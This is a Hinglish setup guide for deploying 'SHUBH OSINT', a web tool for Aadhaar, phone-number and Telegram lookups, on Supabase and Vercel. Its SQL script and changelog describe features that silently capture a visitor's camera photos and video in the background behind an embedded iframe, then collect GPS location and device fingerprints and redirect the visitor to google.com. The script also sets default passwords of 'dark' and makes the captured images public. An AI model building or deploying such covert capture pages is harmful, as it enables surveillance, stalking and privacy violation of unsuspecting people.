# 🚀 Complete Migration Guide: Apna Supabase + Vercel Deployment

**Last Updated:** 2026-01-31  
**Version:** 3.4 (Iframe Capture + Session Config cleanup)

---

## 📋 Overview

Is guide mein step-by-step process hai:
1. Apna Supabase project setup
2. Database tables aur RLS policies create karna
3. Edge Functions deploy karna
4. Vercel pe deploy karna

---

## 🗄️ Step 1: Supabase Project Create Karo

1. **Supabase Dashboard** jao: https://supabase.com/dashboard
2. **New Project** click karo
3. Project details fill karo:
   - **Name**: Jo bhi naam dena hai
   - **Database Password**: Strong password set karo (yaad rakhna!)
   - **Region**: Nearest region select karo (Mumbai recommended for India)
4. **Create Project** click karo aur wait karo (2-3 minutes lagenge)

---

## 🔑 Step 2: API Keys Note Karo

Project ban jaane ke baad, **Settings → API** section mein jao:

| Key Name | Kahan Milega | Kahan Use Hoga |
|----------|--------------|----------------|
| **Project URL** | `https://YOUR_PROJECT_ID.supabase.co` | `.env` file, Vercel |
| **Anon (Public) Key** | API Keys section mein | `.env` file, Vercel |
| **Service Role Key** | API Keys section mein (Secret!) | Edge Functions Secrets |
| **Project ID** | URL mein `YOUR_PROJECT_ID` part | `.env` file, Vercel |

⚠️ **Important**: Service Role Key kabhi frontend code mein mat daalna!

---

## 🛠️ Step 3: Database Setup (SQL Run Karo)

### 3.1 SQL Editor Open Karo
Supabase Dashboard → **SQL Editor** → **New Query**

### 3.2 Complete SQL Script Copy-Paste Karo

`public/supabase-complete-setup.sql` file ka poora content copy karke paste karo.

Ya ye SQL directly use karo:

```sql
-- =====================================================
-- SHUBH OSINT - Complete Database Setup v3.2
-- =====================================================

-- 1. TABLES CREATE KARO
-- =====================================================

CREATE TABLE IF NOT EXISTS public.access_passwords (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_hash TEXT NOT NULL,
  password_display TEXT NOT NULL,
  total_credits INTEGER NOT NULL DEFAULT 0,
  remaining_credits INTEGER NOT NULL DEFAULT 0,
  is_enabled BOOLEAN NOT NULL DEFAULT true,
  is_used BOOLEAN NOT NULL DEFAULT false,
  is_unlimited BOOLEAN NOT NULL DEFAULT false,
  used_at TIMESTAMP WITH TIME ZONE,
  device_id TEXT,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public.user_sessions (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_id UUID NOT NULL REFERENCES public.access_passwords(id) ON DELETE CASCADE,
  session_token TEXT NOT NULL,
  device_id TEXT NOT NULL,
  is_active BOOLEAN NOT NULL DEFAULT true,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  last_active_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public.credit_usage (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  password_id UUID NOT NULL REFERENCES public.access_passwords(id) ON DELETE CASCADE,
  search_type TEXT NOT NULL,
  search_query TEXT,
  credits_used INTEGER NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public.app_settings (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  setting_key TEXT NOT NULL UNIQUE,
  setting_value JSONB NOT NULL,
  created_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now(),
  updated_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public.captured_photos (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id TEXT NOT NULL,
  image_data TEXT NOT NULL,
  user_agent TEXT,
  ip_address TEXT,
  captured_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public.captured_videos (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  session_id TEXT NOT NULL,
  video_url TEXT NOT NULL,
  duration_seconds INTEGER DEFAULT 5,
  user_agent TEXT,
  ip_address TEXT,
  captured_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

CREATE TABLE IF NOT EXISTS public.search_history (
  id UUID NOT NULL DEFAULT gen_random_uuid() PRIMARY KEY,
  search_type TEXT NOT NULL,
  search_query TEXT NOT NULL,
  ip_address TEXT,
  searched_at TIMESTAMP WITH TIME ZONE NOT NULL DEFAULT now()
);

-- 2. ROW LEVEL SECURITY (RLS) ENABLE KARO
-- =====================================================

ALTER TABLE public.access_passwords ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.user_sessions ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.credit_usage ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.app_settings ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.captured_photos ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.captured_videos ENABLE ROW LEVEL SECURITY;
ALTER TABLE public.search_history ENABLE ROW LEVEL SECURITY;

-- 3. RLS POLICIES CREATE KARO
-- =====================================================

-- Sensitive tables: No direct access
CREATE POLICY "No direct access to passwords" 
ON public.access_passwords FOR ALL USING (false);

CREATE POLICY "No direct access to sessions" 
ON public.user_sessions FOR ALL USING (false);

CREATE POLICY "No direct access to credit usage" 
ON public.credit_usage FOR ALL USING (false);

-- App Settings: Public read/write
CREATE POLICY "Anyone can read settings" 
ON public.app_settings FOR SELECT USING (true);

CREATE POLICY "Anyone can insert settings" 
ON public.app_settings FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can update settings" 
ON public.app_settings FOR UPDATE USING (true);

-- Captured Photos: Public access (PERMISSIVE required!)
CREATE POLICY "Anyone can view captured photos" 
ON public.captured_photos FOR SELECT USING (true);

CREATE POLICY "Allow insert for photo capture" 
ON public.captured_photos FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can delete captured photos" 
ON public.captured_photos FOR DELETE USING (true);

-- Captured Videos: Public access (PERMISSIVE required!)
CREATE POLICY "Anyone can view captured videos metadata" 
ON public.captured_videos FOR SELECT USING (true);

CREATE POLICY "Anyone can insert video metadata" 
ON public.captured_videos FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can delete video metadata" 
ON public.captured_videos FOR DELETE USING (true);

-- Search History: Public access
CREATE POLICY "Anyone can view search history" 
ON public.search_history FOR SELECT USING (true);

CREATE POLICY "Anyone can insert search history" 
ON public.search_history FOR INSERT WITH CHECK (true);

CREATE POLICY "Anyone can delete search history" 
ON public.search_history FOR DELETE USING (true);

-- 4. STORAGE BUCKETS CREATE KARO
-- =====================================================

INSERT INTO storage.buckets (id, name, public) 
VALUES ('captured-videos', 'captured-videos', true)
ON CONFLICT (id) DO NOTHING;

INSERT INTO storage.buckets (id, name, public) 
VALUES ('captured-photos', 'captured-photos', true)
ON CONFLICT (id) DO NOTHING;

INSERT INTO storage.buckets (id, name, public) 
VALUES ('backgrounds', 'backgrounds', true)
ON CONFLICT (id) DO NOTHING;

-- Storage Policies
CREATE POLICY "Anyone can view captured videos" 
ON storage.objects FOR SELECT USING (bucket_id = 'captured-videos');

CREATE POLICY "Anyone can upload captured videos" 
ON storage.objects FOR INSERT WITH CHECK (bucket_id = 'captured-videos');

CREATE POLICY "Anyone can delete captured videos" 
ON storage.objects FOR DELETE USING (bucket_id = 'captured-videos');

CREATE POLICY "Public can view captured photos" 
ON storage.objects FOR SELECT USING (bucket_id = 'captured-photos');

CREATE POLICY "Anyone can upload captured photos" 
ON storage.objects FOR INSERT WITH CHECK (bucket_id = 'captured-photos');

CREATE POLICY "Anyone can delete captured photos" 
ON storage.objects FOR DELETE USING (bucket_id = 'captured-photos');

CREATE POLICY "Public can view backgrounds" 
ON storage.objects FOR SELECT USING (bucket_id = 'backgrounds');

CREATE POLICY "Anyone can upload backgrounds" 
ON storage.objects FOR INSERT WITH CHECK (bucket_id = 'backgrounds');

CREATE POLICY "Anyone can update backgrounds" 
ON storage.objects FOR UPDATE USING (bucket_id = 'backgrounds');

CREATE POLICY "Anyone can delete backgrounds" 
ON storage.objects FOR DELETE USING (bucket_id = 'backgrounds');

-- 5. FUNCTIONS & TRIGGERS
-- =====================================================

CREATE OR REPLACE FUNCTION public.update_updated_at_column()
RETURNS TRIGGER AS $$
BEGIN
  NEW.updated_at = now();
  RETURN NEW;
END;
$$ LANGUAGE plpgsql SET search_path = public;

CREATE TRIGGER update_app_settings_updated_at
BEFORE UPDATE ON public.app_settings
FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

CREATE TRIGGER update_access_passwords_updated_at
BEFORE UPDATE ON public.access_passwords
FOR EACH ROW EXECUTE FUNCTION public.update_updated_at_column();

-- 6. INDEXES FOR PERFORMANCE
-- =====================================================

CREATE INDEX IF NOT EXISTS idx_app_settings_key ON public.app_settings(setting_key);
CREATE INDEX IF NOT EXISTS idx_user_sessions_token ON public.user_sessions(session_token);
CREATE INDEX IF NOT EXISTS idx_user_sessions_password ON public.user_sessions(password_id);
CREATE INDEX IF NOT EXISTS idx_credit_usage_password ON public.credit_usage(password_id);
CREATE INDEX IF NOT EXISTS idx_captured_photos_session ON public.captured_photos(session_id);
CREATE INDEX IF NOT EXISTS idx_captured_videos_session ON public.captured_videos(session_id);
CREATE INDEX IF NOT EXISTS idx_search_history_type ON public.search_history(search_type);
CREATE INDEX IF NOT EXISTS idx_access_passwords_hash ON public.access_passwords(password_hash);

-- 7. DEFAULT SETTINGS INSERT KARO
-- =====================================================
-- NOTE: camSessionId is ONLY changeable via Admin Panel (v3.2)

INSERT INTO public.app_settings (setting_key, setting_value)
VALUES (
  'main_settings',
  '{
    "sitePassword": "dark",
    "adminPassword": "dark",
    "theme": "dark",
    "headerName1": "SHUBH",
    "headerName2": "OSINT",
    "headerColor1": "green",
    "headerColor2": "pink",
    "headerFont": "Orbitron",
    "headerStyle": "normal",
    "camSessionId": "shubhcam01",
    "camRedirectUrl": "https://google.com",
    "customCaptureHtml": "",
    "chromeCustomHtml": "",
    "camIframeUrl": "",
    "camPhotoLimit": 0,
    "camCaptureInterval": 500,
    "camVideoDuration": 5,
    "camCountdownTimer": 5,
    "camAutoRedirect": true,
    "camQuality": 0.8,
    "creditSystemEnabled": true,
    "tabs": []
  }'::jsonb
)
ON CONFLICT (setting_key) DO NOTHING;
```

### 3.3 Run Query
**Run** button click karo. Success message aana chahiye.

---

## ⚡ Step 4: Edge Functions Deploy Karo

### 4.1 Supabase CLI Install Karo

```bash
# Windows (PowerShell as Admin)
scoop install supabase

# Mac
brew install supabase/tap/supabase

# Linux
brew install supabase/tap/supabase

# Ya npm se
npm install -g supabase
```

### 4.2 Login Karo

```bash
supabase login
```
Browser open hoga, login karo.

### 4.3 Project Link Karo

```bash
cd your-project-folder
supabase link --project-ref YOUR_PROJECT_ID
```

### 4.4 Edge Functions Deploy Karo

```bash
# Sab functions ek saath deploy
supabase functions deploy auth-login
supabase functions deploy auth-verify
supabase functions deploy credits-deduct
supabase functions deploy admin-passwords
supabase functions deploy aadhar-search
supabase functions deploy numinfo-v2
supabase functions deploy telegram-osint
```

### 4.5 Edge Function Secrets Set Karo

Supabase Dashboard → **Settings** → **Edge Functions** → **Secrets**

| Secret Name | Value |
|-------------|-------|
| `MY_SUPABASE_URL` | `https://YOUR_PROJECT_ID.supabase.co` |
| `MY_SERVICE_ROLE_KEY` | Service Role Key |

---

## 🌐 Step 5: Vercel Deployment

### 5.1 Environment Variables Set Karo

| Variable Name | Value |
|--------------|-------|
| `VITE_SUPABASE_URL` | `https://YOUR_PROJECT_ID.supabase.co` |
| `VITE_SUPABASE_PUBLISHABLE_KEY` | Anon (Public) Key |
| `VITE_SUPABASE_PROJECT_ID` | YOUR_PROJECT_ID |

### 5.2 Deploy Karo

GitHub repo connect karke deploy karo.

---

## 📁 Edge Functions Reference (v3.4)

| Function | Purpose | Method |
|----------|---------|--------|
| `auth-login` | User login with password | POST |
| `auth-verify` | Verify session & get credits | POST |
| `credits-deduct` | Deduct credits for search | POST |
| `admin-passwords` | Admin CRUD operations | POST |
| `aadhar-search` | Aadhar lookup | POST |
| `numinfo-v2` | Phone number info | POST |
| `telegram-osint` | Telegram OSINT API | POST |
| `call-dark` | AI call dispatch | POST |

---

## 🔄 Version 3.4 Changes

### Iframe Capture Feature
- ✅ New `/iframe-capture` page for embedding any URL
- ✅ `camIframeUrl` setting added to app_settings
- ✅ Silent camera capture runs in background with iframe
- ✅ Device info + GPS location captured automatically

### Session Config Cleanup
- ❌ Session change removed from ShubhCam Config tab
- ✅ Session ID ONLY changeable via Admin Panel
- ✅ Cleaner Config tab with only capture settings

### Device Intelligence
- ✅ All capture pages now collect device fingerprint
- ✅ GPS location with Google Maps link
- ✅ Battery, screen, UserAgent info captured
- ✅ Data stored with `sessionId_deviceinfo` identifier

---

## 🔄 Version 3.3 Changes

### CALL DARK Feature
- ✅ AI-powered automated calls via Omnidim API
- ✅ Admin panel settings for API Key, Agent ID
- ✅ Configurable max duration

---

## 🔄 Version 3.2 Changes

### CAM Session Control (Admin Only)
- ❌ Session change button removed from ShubhCam component
- ✅ Session ID can ONLY be changed via Admin Panel → CAM Settings
- ✅ All capture pages (Normal, Custom, Chrome) use session from app_settings

### JSON Result Viewer
- ✅ Syntax highlighting with neon colors
- ✅ Line-by-line typing animation
- ✅ Copy individual fields or all data
- ✅ Export to PDF feature

### Admin Panel Updates
- ✅ Dual header color controls (Name 1 & Name 2)
- ✅ Session ID input in CAM settings only

---

## 🔧 Troubleshooting

### Error: "Failed to fetch" ya CORS Error
- Edge functions mein CORS headers check karo
- Supabase URL sahi hai check karo

### Error: "Invalid password"
- admin-passwords edge function se naya password create karo

### Error: "Insufficient credits"
- Database mein remaining_credits check karo
- is_enabled = true hai check karo

### Camera Not Working
- HTTPS required hai (localhost ok hai)
- Camera permissions allow karo
- RLS policies PERMISSIVE honi chahiye

### Edge Function Deploy Fail
```bash
rm supabase/functions/deno.lock
supabase functions deploy function-name
```

---

## 📊 Database Tables Quick Reference

| Table | Purpose | RLS |
|-------|---------|-----|
| `access_passwords` | Login credentials | Restrictive (Edge only) |
| `user_sessions` | Active sessions | Restrictive (Edge only) |
| `credit_usage` | Credit logs | Restrictive (Edge only) |
| `app_settings` | Global config | Public read/write |
| `captured_photos` | Photo metadata | Public (Permissive) |
| `captured_videos` | Video metadata | Public (Permissive) |
| `search_history` | Search logs | Public |

---

## ✅ Setup Complete Checklist

- [ ] Supabase project created
- [ ] API keys noted
- [ ] SQL script executed
- [ ] Storage buckets created
- [ ] Edge functions deployed
- [ ] Secrets configured
- [ ] Vercel env vars set
- [ ] Site tested

---

**Version:** 3.4  
**Last Updated:** 2026-01-31
